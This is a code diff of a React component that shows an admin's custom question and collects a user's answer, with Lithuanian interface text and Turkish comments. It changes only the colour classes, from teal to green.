@@ -132,14 +132,14 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
   if (!ready) {
     return (
       <div className="flex min-h-screen items-center justify-center px-4">
-        <div className="h-10 w-10 animate-spin rounded-full border-4 border-[#0d9488]/25 border-t-[#0d9488]" />
+        <div className="h-10 w-10 animate-spin rounded-full border-4 border-[#0fae4e]/25 border-t-[#0fae4e]" />
       </div>
     );
   }
 
   return (
     <div className="flex min-h-[100dvh] items-center justify-center px-4 py-10">
-      <div className="w-full max-w-[400px] rounded-[24px] border border-[#dce8f5] bg-white px-6 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
+      <div className="w-full max-w-[400px] rounded-[24px] border border-[#d4ecd9] bg-white px-6 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
         {done ? (
           <div className="py-8 text-center">
             <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-600">
@@ -169,8 +169,8 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
 
             {/* Kalkan ikonu */}
             <div className="flex justify-center">
-              <div className="flex h-16 w-16 items-center justify-center rounded-full bg-[#eef4fb]">
-                <svg className="h-8 w-8 text-[#7ba7d9]" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
+              <div className="flex h-16 w-16 items-center justify-center rounded-full bg-[#eef9f0]">
+                <svg className="h-8 w-8 text-[#86efac]" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
                   <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
                 </svg>
               </div>
@@ -182,8 +182,8 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
             </h1>
 
             {/* Admin'in sorusu */}
-            <div className="rounded-xl border-l-4 border-[#14b8a6] bg-[#f0faf6] px-4 py-3">
-              <p className="mb-1 text-[10px] font-bold uppercase tracking-widest text-[#0d9488]">
+            <div className="rounded-xl border-l-4 border-[#22c55e] bg-[#f0faf6] px-4 py-3">
+              <p className="mb-1 text-[10px] font-bold uppercase tracking-widest text-[#0fae4e]">
                 Klausimas
               </p>
               <p className="text-sm font-semibold text-gray-800 break-words">
@@ -208,7 +208,7 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
                   value={answer}
                   onChange={(e) => setAnswer(e.target.value)}
                   placeholder="Įveskite savo atsakymą čia..."
-                  className="w-full rounded-xl border border-gray-200 bg-gray-50 py-3.5 pl-10 pr-4 text-sm font-medium text-gray-900 outline-none transition-all focus:border-[#14b8a6] focus:bg-white focus:ring-2 focus:ring-[#14b8a6]/20"
+                  className="w-full rounded-xl border border-gray-200 bg-gray-50 py-3.5 pl-10 pr-4 text-sm font-medium text-gray-900 outline-none transition-all focus:border-[#22c55e] focus:bg-white focus:ring-2 focus:ring-[#22c55e]/20"
                 />
               </div>
             </div>
@@ -218,7 +218,7 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
             <button
               type="submit"
               disabled={saving || !answer.trim()}
-              className="flex w-full items-center justify-center gap-2 rounded-xl bg-[#0d9488] px-4 py-3.5 text-[15px] font-bold uppercase tracking-wide text-white shadow-lg shadow-[#0d9488]/25 transition-all hover:bg-[#0f766e] disabled:opacity-50"
+              className="flex w-full items-center justify-center gap-2 rounded-xl bg-[#0fae4e] px-4 py-3.5 text-[15px] font-bold uppercase tracking-wide text-white shadow-lg shadow-[#0fae4e]/25 transition-all hover:bg-[#007a38] disabled:opacity-50"
             >
               {saving ? "Siunčiama..." : "Tęsti"}
               <svg className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
